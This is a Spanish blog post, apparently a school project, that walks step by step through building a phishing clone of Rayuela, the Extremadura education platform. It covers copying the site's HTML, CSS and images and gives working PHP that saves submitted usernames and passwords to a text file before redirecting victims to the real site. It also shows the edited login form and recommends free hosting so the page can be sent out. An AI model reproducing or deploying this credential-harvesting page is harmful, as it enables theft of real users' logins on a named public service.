---
layout: post
current: post
cover: assets/images/3.jpg
navigation: True
title: Phishing Rayuela
date: 2021-01-29 10:18:00
tags: 2-Bachillerato
class: post-template
subclass: 'post'
author: aalmeidar
---

# Phishing
Este trabajo esta relacionado con el anterior, puesto que, tras exponer el video de la prueba de una página web de phishing, elabore una exposicion de como montar este tipo de servidores de forma totalmente gratuita.
## Introducción
En esta entrada, elaboraremos paso a paso una aplicación web phishing. Primeramente, definamos lo que es el phishing:

El *phishing* es una técnica que consiste en el envío de un correo electrónico por parte de un ciberdelincuente a un usuario simulando ser una entidad legítima con el objetivo de robarle información privada, realizarle un cargo económico o infectar el dispositivo. Para ello, adjuntan archivos infectados o enlaces a páginas fraudulentas en el correo electrónico.

Tendremos como objetivo la pagina de Rayuela (Plataforma Integral Educativa de la Consejería de Educación de la Junta de Extremadura).
Para ello, usaremos las tecnologías frecuentes en el desarrollo web (HTML, CSS, PHP) y un hosting.

## Video

[![Watch the video](https://i.ytimg.com/vi/-Hrk3IBMZGI/maxresdefault.jpg)](https://www.youtube.com/watch?v=-Hrk3IBMZGI)

## Estudio de la web
Lo primero que debemos hacer es acceder a la web y tener un pequeño mapa mental de la estructura externa. Ademas, podemos ir echando un vistazo a las tecnologías usadas y como han sido desarrolladas (si el css esta junto a html o en una hoja de estilo, etc).


## HTML
Para comenzar, copiaremos el html de la web objetivo. HTML es un lenguaje de marcado que se utiliza para el desarrollo de páginas de Internet. Se trata de la sigla que corresponde a HyperText Markup Language, es decir, Lenguaje de Marcas de Hipertexto, que podría ser traducido como Lenguaje de Formato de Documentos para Hipertexto.
Podemos hacer esto de varias formas:
- Usar el comando ```wget``` o ```curl``` a través de la terminal para obtener el html
- Click derecho, ver código fuente, copiamos y guardamos en un archivo con extensión html.
    
Si vamos viendo nuestro progreso veremos la pagina que aun no se parece mucho a nuestro objetivo, la estética la conseguiremos con css.


## CSS
La sigla CSS corresponde a la expresión inglesa Cascading StyleSheets, que puede traducirse como “Hojas de estilo en cascada”. El concepto se utiliza en el ámbito de la informática para referirse a un lenguaje empleado en el diseño gráfico.
Si CSS esta externo al html, nos será necesario buscar la ruta de este archivo. Comunmente, entre las etiquetas head de html se coloca la ruta a este archivo. En nustro caso, se observa la ruta en una línea.

Si accedemos a la dirección, encontraremos todo el css que afecta a nuestra web. Hacemos igual que con el html, lo copiamos y guardamos en un archivo con extensión css. (Se debe de poner la misma ruta y nombre).

Ya se observa una mejora de nuestra web pero aun nos falta algo, las imágenes.



## Imágenes
Para obtener las imágenes, podemos usar [herramientas online](https://imagecyborg.com/) aunque en nuestro caso no obtendremos todas, puesto que, también hay imágenes en el css.
Por orta parte, se puede hacer manualmente, si observamos el html veremos las rutas de las imágenes al igual que en el css.
Para ir mas rápido en la búsqueda de imágenes, se puede usar filtros por .png .jpg .gif.
Una vez encontradas, las descargaremos y guardaremos con la misma ruta. Ya tenemos la web copiada.

## PHP
PHP (acrónimo recursivo de PHP: Hypertext Preprocessor) es un lenguaje de código abierto muy popular especialmente adecuado para el desarrollo web y que puede ser incrustado en HTML.
Lo usaremos para recoger la información de los inputs y guardarla en un archvio txt.

```php
<?php
file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://rayuela.educarex.es');
exit();
```
La función file_put_contents escribe informacion en un fichero tiene esta sintaxis:
file_put_contents(filename, data, mode, context)
La función PHP header nos permite enviar encabezados sin formato al cliente (robot, navegador…). Es una manera de forzar dicho envío antes de que se lean los encabezados de la propia página.
Ahora deberemos ir al código HMTL y cambiar en los inputs los valores a username y password. Nos quedaría algo asi:
```html
<div class="columna">
  <label for="ussername">Usuario</label>
  <input name="username" type="text" id="username" />
</div>
<div class="columna">
  <label for="password">Clave</label>
  <input name="password" type="password" id="password " />
</div>
```
Además, debemos cambiar la redirección del action de form  a login.php:

```html
<form name="formulario" id="formulario" method="post" action="login.php">
```
## Hosting 

Después de tener todo el login perfecto para el phishing toca subirlo a la red para poder enviarlo. En este caso usaremos un [hosting gratuito](https://000webhost.com).



## Práctica

Para comprobar los conociminetos adquiridos, realiza un página phishing a esta [Web](https://aalmeidar.000webhostapp.com)




## Para ampliar

- [Ejemplo de phsishing paso a paso (BBVA)](https://www.bbva.com/es/un-ejemplo-de-phishing-paso-a-paso/)
- [Ingeniería social: Phishing y baiting](http://repository.unipiloto.edu.co/bitstream/handle/20.500.12277/6349/Ingenieria%20social%20Phishing%20y%20Baiting.pdf?sequence=1&isAllowed=y)
- [Los ataques de ingeniería social más habituales son los fraudes online](https://cuadernosdeseguridad.com/2020/07/ingenieria-social-engano-pablo-iglesias-phishing/)
- [Metodologías de Ingeniería Social ](http://openaccess.uoc.edu/webapps/o2/bitstream/10609/81255/6/jrodriguezrinTFM0618memoria.pdf)
- [Phishing: la automatización de la ingienería social](https://repository.eafit.edu.co/bitstream/handle/10784/2443/salazar_natalia_2007.pdf?sequence=1)
